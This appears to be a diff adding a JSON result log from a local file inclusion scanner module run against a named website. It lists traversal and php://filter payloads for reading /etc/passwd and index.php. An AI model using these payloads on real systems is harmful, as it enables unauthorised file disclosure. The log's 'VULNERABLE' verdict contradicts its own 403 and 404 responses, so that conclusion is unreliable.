@@ -1,0 +1,41 @@
+{
+    "module": "rm_mod_030_lfi_surface.py",
+    "module_path": "modules\\rm_mod_030_lfi_surface.py",
+    "target": "http://www.virtualsec.org/",
+    "started_at": "2025-11-10T20:57:55.487742Z",
+    "stdout": "{\n  \"module\": \"rm_mod_030_lfi_surface\",\n  \"target\": \"http://www.virtualsec.org\",\n  \"vulnerable\": true,\n  \"findings\": [\n    {\n      \"payload\": {\n        \"file\": \"./../../../../etc/passwd\"\n      },\n      \"status\": 403,\n      \"len\": 1242\n    },\n    {\n      \"payload\": {\n        \"file\": \"./phpinfo.php\"\n      },\n      \"status\": 404,\n      \"len\": 68726\n    },\n    {\n      \"payload\": {\n        \"file\": \"php://filter/convert.base64-encode/resource=./index.php\"\n      },\n      \"status\": 403,\n      \"len\": 1242\n    }\n  ]\n}\n",
+    "stderr": "",
+    "exit_code": 0,
+    "parsed_json": {
+        "module": "rm_mod_030_lfi_surface",
+        "target": "http://www.virtualsec.org",
+        "vulnerable": true,
+        "findings": [
+            {
+                "payload": {
+                    "file": "./../../../../etc/passwd"
+                },
+                "status": 403,
+                "len": 1242
+            },
+            {
+                "payload": {
+                    "file": "./phpinfo.php"
+                },
+                "status": 404,
+                "len": 68726
+            },
+            {
+                "payload": {
+                    "file": "php://filter/convert.base64-encode/resource=./index.php"
+                },
+                "status": 403,
+                "len": 1242
+            }
+        ]
+    },
+    "conclusion": "VULNERABLE",
+    "reason": "module reported vulnerable",
+    "error": null,
+    "finished_at": "2025-11-10T20:57:59.456869Z"
+}
